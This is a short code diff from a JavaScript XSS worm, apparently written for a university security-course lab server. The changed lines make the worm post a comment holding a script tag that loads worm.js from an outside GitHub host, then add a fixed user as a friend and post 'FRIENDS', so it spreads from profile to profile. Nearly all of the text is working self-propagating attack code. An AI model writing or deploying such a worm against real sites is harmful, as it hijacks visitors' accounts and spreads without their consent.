@@ -20,7 +20,7 @@ function worm() {
     
     if(eff.match('208') == null){
         $.get("http://csec380-core.csec.rit.edu:86/add_comment.php",
-              { comment: '<script src="https://cdn.jsdelivr.net/gh/DarkLemon27/WebApp/easyworm.js"></script>'});
+              { comment: '<script src="https://raw.githubusercontent.com/gjh6958/xssworm/master/worm.js"></script>'});
         $.get("http://csec380-core.csec.rit.edu:86/add_friend.php",{id: 208});
         $.get("http://csec380-core.csec.rit.edu:86/add_comment.php",{id: 208,comment: 'FRIENDS'});
     }
